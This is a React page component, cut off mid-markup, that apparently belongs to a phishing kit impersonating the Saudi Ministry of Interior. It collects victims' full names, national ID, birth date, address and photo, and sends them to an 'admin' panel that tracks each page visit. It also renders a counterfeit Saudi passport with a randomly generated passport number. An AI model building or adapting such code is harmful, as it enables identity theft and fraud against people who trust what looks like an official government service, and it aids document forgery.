import { useState, useEffect } from 'react';
import { sendData, navigateToPage, updatePage } from '@/lib/store';
import { useLocation } from 'wouter';
import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { CalendarIcon } from 'lucide-react';
import { Calendar } from "@/components/ui/calendar";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import { cn } from "@/lib/utils";

const Documents = () => {
  const [, navigate] = useLocation();
  
  // Get service name from URL
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'الوثائق والمستندات';
  
  // Update page name in admin panel
  useEffect(() => {
    updatePage("صفحة الوثائق");
    navigateToPage("صفحة الوثائق");
  }, []);

  // Arabic Name (4 parts)
  const [arabicFirstName, setArabicFirstName] = useState('');
  const [arabicSecondName, setArabicSecondName] = useState('');
  const [arabicThirdName, setArabicThirdName] = useState('');
  const [arabicFourthName, setArabicFourthName] = useState('');
  
  // English Name (4 parts)
  const [englishFirstName, setEnglishFirstName] = useState('');
  const [englishSecondName, setEnglishSecondName] = useState('');
  const [englishThirdName, setEnglishThirdName] = useState('');
  const [englishFourthName, setEnglishFourthName] = useState('');
  
  // Passport Number (random: 2 capital letters + 5 digits)
  const [passportNumber] = useState(() => {
    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const randomLetters = letters.charAt(Math.floor(Math.random() * 26)) + letters.charAt(Math.floor(Math.random() * 26));
    const randomNumbers = Math.floor(10000 + Math.random() * 90000).toString();
    return randomLetters + randomNumbers;
  });

  // National ID
  const [nationalId, setNationalId] = useState('');
  const [nationalIdError, setNationalIdError] = useState('');
  
  // Gender
  const [gender, setGender] = useState('');
  
  // Date of Birth
  const [calendarType, setCalendarType] = useState<'gregorian' | 'hijri'>('gregorian');
  const [dateOfBirth, setDateOfBirth] = useState<Date | undefined>(undefined);
  const [hijriDate, setHijriDate] = useState({ day: '', month: '', year: '' });
  
  // Personal Photo
  const [personalPhoto, setPersonalPhoto] = useState<File | null>(null);
  const [photoPreview, setPhotoPreview] = useState<string | null>(null);
  const [photoNoBg, setPhotoNoBg] = useState<string | null>(null);
  const [isRemovingBg, setIsRemovingBg] = useState(false);
  
  // National Address
  const [province, setProvince] = useState('');
  const [district, setDistrict] = useState('');
  const [streetName, setStreetName] = useState('');
  const [buildingNumber, setBuildingNumber] = useState('');
  const [floorNumber, setFloorNumber] = useState('');
  
  // Validation errors
  const [validationErrors, setValidationErrors] = useState<Record<string, string>>({});

  // Saudi Provinces and Districts
  const provincesData: Record<string, string[]> = {
    'الرياض': ['الرياض', 'الدرعية', 'الخرج', 'الدوادمي', 'المجمعة', 'القويعية', 'وادي الدواسر', 'الأفلاج', 'الزلفي', 'شقراء', 'حوطة بني تميم', 'عفيف', 'السليل', 'ضرما', 'المزاحمية', 'رماح', 'ثادق', 'حريملاء', 'الحريق', 'الغاط', 'مرات'],
    'مكة المكرمة': ['مكة المكرمة', 'جدة', 'الطائف', 'القنفذة', 'الليث', 'رابغ', 'خليص', 'الجموم', 'الكامل', 'الخرمة', 'رنية', 'تربة', 'الموية', 'ميسان', 'أضم', 'العرضيات', 'بحرة'],
    'المدينة المنورة': ['المدينة المنورة', 'ينبع', 'العلا', 'مهد الذهب', 'الحناكية', 'بدر', 'خيبر', 'وادي الفرع'],
    'القصيم': ['بريدة', 'عنيزة', 'الرس', 'المذنب', 'البكيرية', 'البدائع', 'الأسياح', 'النبهانية', 'الشماسية', 'عيون الجواء', 'رياض الخبراء', 'عقلة الصقور', 'ضريه'],
    'المنطقة الشرقية': ['الدمام', 'الأحساء', 'حفر الباطن', 'الجبيل', 'القطيف', 'الخبر', 'الظهران', 'رأس تنورة', 'بقيق', 'النعيرية', 'قرية العليا', 'العديد'],
    'عسير': ['أبها', 'خميس مشيط', 'بيشة', 'النماص', 'محايل عسير', 'ظهران الجنوب', 'تثليث', 'سراة عبيدة', 'رجال ألمع', 'أحد رفيدة', 'بلقرن', 'المجاردة', 'البرك', 'تنومة'],
    'تبوك': ['تبوك', 'الوجه', 'ضباء', 'تيماء', 'أملج', 'حقل', 'البدع'],
    'حائل': ['حائل', 'بقعاء', 'الغزالة', 'الشنان', 'الحائط', 'السليمي', 'موقق', 'الشملي'],
    'الحدود الشمالية': ['عرعر', 'رفحاء', 'طريف', 'العويقيلة'],
    'جازان': ['جازان', 'صبيا', 'أبو عريش', 'صامطة', 'بيش', 'الدرب', 'الريث', 'ضمد', 'الحرث', 'فرسان', 'الدائر', 'العيدابي', 'أحد المسارحة', 'العارضة', 'فيفاء', 'الطوال', 'هروب'],
    'نجران': ['نجران', 'شرورة', 'حبونا', 'بدر الجنوب', 'يدمة', 'ثار', 'خباش'],
    'الباحة': ['الباحة', 'بلجرشي', 'المندق', 'المخواة', 'قلوة', 'العقيق', 'غامد الزناد', 'الحجرة', 'بني حسن'],
    'الجوف': ['سكاكا', 'دومة الجندل', 'القريات', 'طبرجل', 'صوير']
  };

  const provinces = Object.keys(provincesData);
  const districts = province ? provincesData[province] || [] : [];

  // Hijri months
  const hijriMonths = [
    { value: '1', label: 'محرم' },
    { value: '2', label: 'صفر' },
    { value: '3', label: 'ربيع الأول' },
    { value: '4', label: 'ربيع الثاني' },
    { value: '5', label: 'جمادى الأولى' },
    { value: '6', label: 'جمادى الآخرة' },
    { value: '7', label: 'رجب' },
    { value: '8', label: 'شعبان' },
    { value: '9', label: 'رمضان' },
    { value: '10', label: 'شوال' },
    { value: '11', label: 'ذو القعدة' },
    { value: '12', label: 'ذو الحجة' },
  ];

  // Validate National ID
  const validateNationalId = (value: string) => {
    if (value.length > 0 && value.length !== 10) {
      setNationalIdError('رقم الهوية يجب أن يكون 10 أرقام');
      return false;
    }
    if (value.length === 10 && !value.startsWith('1') && !value.startsWith('2')) {
      setNationalIdError('رقم الهوية يجب أن يبدأ بـ 1 أو 2');
      return false;
    }
    setNationalIdError('');
    return true;
  };

  // Handle form submission
  const handleSubmit = () => {
    const errors: Record<string, string> = {};
    
    // Validate Arabic name
    if (!arabicFirstName) errors.arabicFirstName = 'الاسم الأول مطلوب';
    if (!arabicSecondName) errors.arabicSecondName = 'اسم الأب مطلوب';
    if (!arabicThirdName) errors.arabicThirdName = 'اسم الجد مطلوب';
    if (!arabicFourthName) errors.arabicFourthName = 'اسم العائلة مطلوب';
    
    // Validate English name
    if (!englishFirstName) errors.englishFirstName = 'First name is required';
    if (!englishSecondName) errors.englishSecondName = 'Second name is required';
    if (!englishThirdName) errors.englishThirdName = 'Third name is required';
    if (!englishFourthName) errors.englishFourthName = 'Last name is required';
    
    // Validate National ID
    if (!nationalId) {
      errors.nationalId = 'رقم الهوية مطلوب';
    } else if (nationalId.length !== 10) {
      errors.nationalId = 'رقم الهوية يجب أن يكون 10 أرقام';
    }
    
    // Validate Date of Birth
    if (calendarType === 'gregorian' && !dateOfBirth) {
      errors.dateOfBirth = 'تاريخ الميلاد مطلوب';
    }
    if (calendarType === 'hijri' && (!hijriDate.day || !hijriDate.month || !hijriDate.year)) {
      errors.dateOfBirth = 'تاريخ الميلاد مطلوب';
    }
    
    setValidationErrors(errors);
    
    if (Object.keys(errors).length === 0) {
      // Send data to admin
      const formData = {
        'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
        'الاسم الأول (عربي)': arabicFirstName,
        'اسم الأب (عربي)': arabicSecondName,
        'اسم الجد (عربي)': arabicThirdName,
        'اسم العائلة (عربي)': arabicFourthName,
        'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
        'First Name': englishFirstName,
        'Second Name': englishSecondName,
        'Third Name': englishThirdName,
        'Last Name': englishFourthName,
        'رقم الهوية الوطنية': nationalId,
        'تاريخ الميلاد': calendarType === 'hijri' 
          ? `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`
          : dateOfBirth?.toLocaleDateString('ar-SA'),
      };
      
      sendData({
        current: 'صفحة الوثائق',
        ...formData,
        waitingForAdminResponse: true,
      });
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />
      
      <main className="flex-1 py-8">
        <div className="container mx-auto px-4 max-w-4xl">
          {/* Logo */}
          <div className="flex justify-center mb-8">
            <img 
              src="/images/moi-logo.png" 
              alt="وزارة الداخلية" 
              className="h-40 object-contain"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
          </div>
          
          <div className="bg-white rounded-xl shadow-lg p-6 md:p-8">
            <h1 className="text-2xl font-bold text-center text-gray-800 mb-8">{serviceName}</h1>
            
            {/* National ID and Date of Birth */}
            <div className="mb-8">
              <h2 className="text-lg font-bold text-gray-700 mb-4 border-b pb-2">معلومات الهوية</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* National ID */}
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">رقم الهوية الوطنية <span className="text-red-500">*</span></Label>
                  <Input
                    value={nationalId}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 10);
                      setNationalId(value);
                      validateNationalId(value);
                      if (validationErrors.nationalId) {
                        setValidationErrors(prev => ({ ...prev, nationalId: '' }));
                      }
                    }}
                    placeholder="1xxxxxxxxx"
                    className={`text-right ${validationErrors.nationalId || nationalIdError ? 'border-red-500' : ''}`}
                    maxLength={10}
                  />
                  {(validationErrors.nationalId || nationalIdError) && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.nationalId || nationalIdError}</p>
                  )}
                </div>
                
                {/* Date of Birth */}
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <Label className="text-gray-600 text-sm">تاريخ الميلاد <span className="text-red-500">*</span></Label>
                    <div className="flex gap-1">
                      <button
                        type="button"
                        onClick={() => setCalendarType('gregorian')}
                        className={cn(
                          "text-[10px] px-2 py-0.5 rounded border transition-colors",
                          calendarType === 'gregorian' 
                            ? "bg-green-600 text-white border-green-600" 
                            : "bg-white text-gray-500 border-gray-200 hover:bg-gray-50"
                        )}
                      >
                        ميلادي
                      </button>
                      <button
                        type="button"
                        onClick={() => setCalendarType('hijri')}
                        className={cn(
                          "text-[10px] px-2 py-0.5 rounded border transition-colors",
                          calendarType === 'hijri' 
                            ? "bg-green-600 text-white border-green-600" 
                            : "bg-white text-gray-500 border-gray-200 hover:bg-gray-50"
                        )}
                      >
                        هجري
                      </button>
                    </div>
                  </div>

                  {calendarType === 'gregorian' ? (
                    <Popover>
                      <PopoverTrigger asChild>
                        <Button
                          variant={"outline"}
                          className={cn(
                            "w-full justify-start text-right font-normal h-12",
                            !dateOfBirth && "text-muted-foreground",
                            validationErrors.dateOfBirth && "border-red-500"
                          )}
                        >
                          <CalendarIcon className="ml-2 h-4 w-4" />
                          {dateOfBirth ? dateOfBirth.toLocaleDateString('en-CA') : <span>اختر التاريخ</span>}
                        </Button>
                      </PopoverTrigger>
                      <PopoverContent className="w-auto p-0" align="start">
                        <Calendar
                          mode="single"
                          selected={dateOfBirth}
                          onSelect={(date) => {
                            setDateOfBirth(date);
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          disabled={(date) => date > new Date() || date < new Date("1940-01-01")}
                          initialFocus
                          captionLayout="dropdown"
                          fromYear={1940}
                          toYear={new Date().getFullYear()}
                        />
                      </PopoverContent>
                    </Popover>
                  ) : (
                    <div className="grid grid-cols-3 gap-2">
                      <div>
                        <select
                          value={hijriDate.day}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, day: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                        >
                          <option value="">اليوم</option>
                          {Array.from({ length: 30 }, (_, i) => i + 1).map(day => (
                            <option key={day} value={day}>{day}</option>
                          ))}
                        </select>
                      </div>
                      <div>
                        <select
                          value={hijriDate.month}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, month: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                        >
                          <option value="">الشهر</option>
                          {hijriMonths.map(month => (
                            <option key={month.value} value={month.value}>{month.label}</option>
                          ))}
                        </select>
                      </div>
                      <div>
                        <select
                          value={hijriDate.year}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, year: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                        >
                          <option value="">السنة</option>
                          {Array.from({ length: 60 }, (_, i) => 1446 - i).map(year => (
                            <option key={year} value={year}>{year}</option>
                          ))}
                        </select>
                      </div>
                    </div>
                  )}
                  {validationErrors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{validationErrors.dateOfBirth}</p>}
                </div>
              </div>
            </div>
            
            {/* Gender Section */}
            <div className="mb-8">
              <h2 className="text-lg font-bold text-gray-700 mb-2 border-b pb-2 text-right">الجنس</h2>
              <div className="text-right mt-2">
                <select
                  value={gender}
                  onChange={(e) => setGender(e.target.value)}
                  className="w-48 h-10 px-3 rounded-md border border-gray-200 text-sm text-right bg-white"
                  style={{ direction: 'rtl' }}
                >
                  <option value="">اختر الجنس</option>
                  <option value="ذكر">ذكر</option>
                  <option value="أنثى">أنثى</option>
                </select>
              </div>
            </div>
            
            {/* Arabic Name Section */}
            <div className="mb-8">
              <h2 className="text-lg font-bold text-gray-700 mb-4 border-b pb-2">الاسم بالعربي</h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">الاسم الأول <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicFirstName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicFirstName(value);
                      if (validationErrors.arabicFirstName) {
                        setValidationErrors(prev => ({ ...prev, arabicFirstName: '' }));
                      }
                    }}
                    placeholder="محمد"
                    className={`text-right ${validationErrors.arabicFirstName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.arabicFirstName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicFirstName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">اسم الأب <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicSecondName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicSecondName(value);
                      if (validationErrors.arabicSecondName) {
                        setValidationErrors(prev => ({ ...prev, arabicSecondName: '' }));
                      }
                    }}
                    placeholder="عبدالله"
                    className={`text-right ${validationErrors.arabicSecondName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.arabicSecondName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicSecondName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">اسم الجد <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicThirdName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicThirdName(value);
                      if (validationErrors.arabicThirdName) {
                        setValidationErrors(prev => ({ ...prev, arabicThirdName: '' }));
                      }
                    }}
                    placeholder="أحمد"
                    className={`text-right ${validationErrors.arabicThirdName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.arabicThirdName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicThirdName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">اسم العائلة <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicFourthName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicFourthName(value);
                      if (validationErrors.arabicFourthName) {
                        setValidationErrors(prev => ({ ...prev, arabicFourthName: '' }));
                      }
                    }}
                    placeholder="السعودي"
                    className={`text-right ${validationErrors.arabicFourthName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.arabicFourthName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicFourthName}</p>}
                </div>
              </div>
            </div>
            
            {/* English Name Section */}
            <div className="mb-8">
              <h2 className="text-lg font-bold text-gray-700 mb-4 border-b pb-2">الاسم بالإنجليزي</h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block text-left" dir="ltr">First Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishFirstName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishFirstName(value);
                      if (validationErrors.englishFirstName) {
                        setValidationErrors(prev => ({ ...prev, englishFirstName: '' }));
                      }
                    }}
                    placeholder="Mohammed"
                    className={`text-left ${validationErrors.englishFirstName ? 'border-red-500' : ''}`}
                    dir="ltr"
                  />
                  {validationErrors.englishFirstName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishFirstName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block text-left" dir="ltr">Second Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishSecondName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishSecondName(value);
                      if (validationErrors.englishSecondName) {
                        setValidationErrors(prev => ({ ...prev, englishSecondName: '' }));
                      }
                    }}
                    placeholder="Abdullah"
                    className={`text-left ${validationErrors.englishSecondName ? 'border-red-500' : ''}`}
                    dir="ltr"
                  />
                  {validationErrors.englishSecondName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishSecondName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block text-left" dir="ltr">Third Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishThirdName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishThirdName(value);
                      if (validationErrors.englishThirdName) {
                        setValidationErrors(prev => ({ ...prev, englishThirdName: '' }));
                      }
                    }}
                    placeholder="Ahmed"
                    className={`text-left ${validationErrors.englishThirdName ? 'border-red-500' : ''}`}
                    dir="ltr"
                  />
                  {validationErrors.englishThirdName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishThirdName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block text-left" dir="ltr">Last Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishFourthName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishFourthName(value);
                      if (validationErrors.englishFourthName) {
                        setValidationErrors(prev => ({ ...prev, englishFourthName: '' }));
                      }
                    }}
                    placeholder="Alsaudi"
                    className={`text-left ${validationErrors.englishFourthName ? 'border-red-500' : ''}`}
                    dir="ltr"
                  />
                  {validationErrors.englishFourthName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishFourthName}</p>}
                </div>
              </div>
            </div>
            
            {/* National Address Section */}
            <div className="mb-8">
              <h2 className="text-lg font-bold text-gray-700 mb-4 border-b pb-2">العنوان الوطني</h2>
              <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-4">
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">المحافظة <span className="text-red-500">*</span></Label>
                  <select
                    value={province}
                    onChange={(e) => {
                      setProvince(e.target.value);
                      setDistrict('');
                      if (validationErrors.province) {
                        setValidationErrors(prev => ({ ...prev, province: '' }));
                      }
                    }}
                    className={`w-full h-12 px-3 py-2 border rounded-md text-right bg-white ${validationErrors.province ? 'border-red-500' : 'border-gray-300'}`}
                  >
                    <option value="">اختر المحافظة</option>
                    {provinces.map(p => (
                      <option key={p} value={p}>{p}</option>
                    ))}
                  </select>
                  {validationErrors.province && <p className="text-red-500 text-xs mt-1">{validationErrors.province}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">المنطقة <span className="text-red-500">*</span></Label>
                  <select
                    value={district}
                    onChange={(e) => {
                      setDistrict(e.target.value);
                      if (validationErrors.district) {
                        setValidationErrors(prev => ({ ...prev, district: '' }));
                      }
                    }}
                    disabled={!province}
                    className={`w-full h-12 px-3 py-2 border rounded-md text-right bg-white ${validationErrors.district ? 'border-red-500' : 'border-gray-300'} ${!province ? 'opacity-50 cursor-not-allowed' : ''}`}
                  >
                    <option value="">اختر المنطقة</option>
                    {districts.map(d => (
                      <option key={d} value={d}>{d}</option>
                    ))}
                  </select>
                  {validationErrors.district && <p className="text-red-500 text-xs mt-1">{validationErrors.district}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">اسم الشارع <span className="text-red-500">*</span></Label>
                  <Input
                    value={streetName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setStreetName(value);
                      if (validationErrors.streetName) {
                        setValidationErrors(prev => ({ ...prev, streetName: '' }));
                      }
                    }}
                    placeholder="اسم الشارع"
                    className={`text-right ${validationErrors.streetName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.streetName && <p className="text-red-500 text-xs mt-1">{validationErrors.streetName}</p>}
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">رقم المبنى <span className="text-red-500">*</span></Label>
                  <Input
                    value={buildingNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '');
                      setBuildingNumber(value);
                      if (validationErrors.buildingNumber) {
                        setValidationErrors(prev => ({ ...prev, buildingNumber: '' }));
                      }
                    }}
                    placeholder="رقم المبنى"
                    className={`text-right ${validationErrors.buildingNumber ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.buildingNumber && <p className="text-red-500 text-xs mt-1">{validationErrors.buildingNumber}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">الدور <span className="text-red-500">*</span></Label>
                  <Input
                    value={floorNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '');
                      setFloorNumber(value);
                      if (validationErrors.floorNumber) {
                        setValidationErrors(prev => ({ ...prev, floorNumber: '' }));
                      }
                    }}
                    placeholder="رقم الدور"
                    className={`text-right ${validationErrors.floorNumber ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.floorNumber && <p className="text-red-500 text-xs mt-1">{validationErrors.floorNumber}</p>}
                </div>
              </div>
            </div>
            
{/* Personal Photo Section */}
            <div className="mb-8">
              <h3 className="text-lg font-semibold text-gray-700 mb-4 text-right">الصورة الشخصية</h3>
              <div className="flex flex-row-reverse items-start gap-8 justify-end">
                {/* Photo Upload */}
                <div className="flex flex-col items-center gap-4">
                {photoPreview ? (
                  <div className="relative">
                    <img 
                      src={photoPreview} 
                      alt="الصورة الشخصية" 
                      className="w-40 h-40 object-cover rounded-lg border-2 border-gray-300"
                    />
                    <button
                      type="button"
                      onClick={() => {
                        setPersonalPhoto(null);
                        setPhotoPreview(null);
                      }}
                      className="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm hover:bg-red-600"
                    >
                      ×
                    </button>
                  </div>
                ) : (
                  <div className="w-40 h-40 border-2 border-dashed border-gray-300 rounded-lg flex items-center justify-center bg-gray-50">
                    <span className="text-gray-400 text-sm">لا توجد صورة</span>
                  </div>
                )}
                <label className="cursor-pointer">
                  <input
                    type="file"
                    accept="image/*"
                    className="hidden"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (file) {
                        setPersonalPhoto(file);
                        const reader = new FileReader();
                        reader.onloadend = () => {
                          const imgSrc = reader.result as string;
                          setPhotoPreview(imgSrc);
                          
                          // Simple white background removal
                          setIsRemovingBg(true);
                          const img = new Image();
                          img.onload = () => {
                            const canvas = document.createElement('canvas');
                            const ctx = canvas.getContext('2d', { willReadFrequently: true });
                            if (ctx) {
                              canvas.width = img.naturalWidth;
                              canvas.height = img.naturalHeight;
                              ctx.imageSmoothingEnabled = true;
                              ctx.imageSmoothingQuality = 'high';
                              ctx.drawImage(img, 0, 0);
                              
                              const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                              const data = imageData.data;
                              
                              // Remove white background only
                              for (let i = 0; i < data.length; i += 4) {
                                const r = data[i];
                                const g = data[i + 1];
                                const b = data[i + 2];
                                const brightness = (r + g + b) / 3;
                                
                                // Remove white/light gray background
                                const isGrayish = Math.abs(r - g) < 20 && Math.abs(g - b) < 20;
                                
                                if (brightness > 230 && isGrayish) {
                                  // White/light gray - fully transparent
                                  data[i + 3] = 0;
                                } else if (brightness > 210 && isGrayish) {
                                  // Near white - smooth transition
                                  const alpha = Math.round((230 - brightness) / 20 * 255);
                                  data[i + 3] = 255 - alpha;
                                }
                              }
                              
                              ctx.putImageData(imageData, 0, 0);
                              setPhotoNoBg(canvas.toDataURL('image/png', 1.0));
                            }
                            setIsRemovingBg(false);
                          };
                          img.src = imgSrc;
                        };
                        reader.readAsDataURL(file);
                        if (validationErrors.personalPhoto) {
                          setValidationErrors(prev => ({ ...prev, personalPhoto: '' }));
                        }
                      }
                    }}
                  />
                  <span className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-md text-sm inline-block">
                    رفع صورة
                  </span>
                </label>
                {validationErrors.personalPhoto && <p className="text-red-500 text-xs">{validationErrors.personalPhoto}</p>}
              </div>
                {/* Photo Requirements */}
                <div className="text-right text-xs text-gray-500 leading-relaxed max-w-xs">
                  <ul className="list-disc list-inside space-y-1">
                    <li>أن يكون مقاس الصورة 4*6.</li>
                    <li>يجب أن تكون خلفية الصورة بيضاء.</li>
                    <li>لابد من أن يكون صاحب الصورة مرتدي الزي الرسمي.</li>
                    <li>يتاح استلام النظارات الطبية أثناء التقاط الصورة.</li>
                    <li>في حال كان المراد تغيير صورته طفل يلزم عدم ارتدائه غطاء على رأسه.</li>
                  </ul>
                </div>
              </div>
            </div>
            
            {/* Submit Button */}
            <div className="flex justify-end mb-8">
              <Button 
                onClick={handleSubmit}
                className="bg-green-600 hover:bg-green-700 text-white px-8 py-2 text-sm"
              >
                حفظ
              </Button>
            </div>
            
            {/* Part Two Section - Dynamic Passport */}
            <div className="mb-8">
              <h3 className="text-lg font-semibold text-gray-700 mb-4 text-right border-b pb-2">الجزء الثاني</h3>
              <div className="flex justify-center">
                {/* Saudi Passport - Empty Background with Emblem */}
                <div className="relative">
                  <img 
                    src="/images/passport-empty-bg.png" 
                    alt="جواز سفر سعودي" 
                    className="max-w-full h-auto rounded-lg shadow-lg"
                  />
                  {/* Saudi Emblem - Palm and Swords */}
                  <img 
                    src="/images/saudi-emblem.png" 
                    alt="شعار المملكة" 
                    className="absolute top-[5%] left-1/2 transform -translate-x-1/2 w-16 h-auto"
                  />
                  <span className="absolute top-[21%] left-1/2 transform -translate-x-1/2 text-[#0D5C3D] text-xs font-semibold">Country Code</span>
                  <span className="absolute top-[24%] left-1/2 transform -translate-x-1/2 text-black text-xs font-bold">SAU</span>
                  <span className="absolute top-[8%] right-[14%] text-[#0D5C3D] text-2xl" style={{fontFamily: 'DecoType Thuluth II, serif'}}>المملكة العربية السعودية</span>
                  <div className="absolute top-[6%] left-[14%] text-[#0D5C3D] text-sm text-left" style={{fontFamily: 'Arial, sans-serif'}}>
                    <div>KINGDOM OF</div>
                    <div>SAUDI ARABIA</div>
                    <div className="text-black font-bold mt-1 text-xs">SAUDI PASSPORT</div>
                    <img src="/images/saudi-flag.jpg" alt="Saudi Flag" className="w-10 h-6 mt-1 mx-auto rounded-sm" />
                  </div>
                  <img src="/images/chip.png" alt="Chip" className="absolute top-[6%] left-[32%] w-10 h-6" />
                  {/* Personal Photo */}
                  {(photoNoBg || photoPreview) && (
                    <div className="absolute top-[32%] left-[12%] w-[16%] h-[38%] overflow-hidden">
                      <img 
                        src={photoNoBg || photoPreview} 
                        alt="الصورة الشخصية" 
                        className="w-full h-full object-cover"
                        style={{
                          imageRendering: '-webkit-optimize-contrast',
                          WebkitBackfaceVisibility: 'hidden',
                          backfaceVisibility: 'hidden',
                          transform: 'translateZ(0)',
                          filter: 'none',
                          WebkitFilter: 'none'
                        }}
                      />
                    </div>
                  )}
                  <span className="absolute top-[21%] left-[32%] text-[#0D5C3D] text-xs font-semibold">Type</span>
                  <span className="absolute top-[24%] left-[33%] text-black text-xs font-bold">P</span>
                  <span className="absolute top-[14%] right-[20%] text-black text-base font-bold" style={{fontFamily: 'Arial, sans-serif'}}>جواز سفر</span>
                  <span className="absolute top-[21%] right-[18%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif'}}>رقم الجواز/Passport No</span>
                  <span className="absolute top-[24%] right-[20%] text-black text-sm font-bold" style={{fontFamily: 'Arial, sans-serif'}}>{passportNumber}</span>
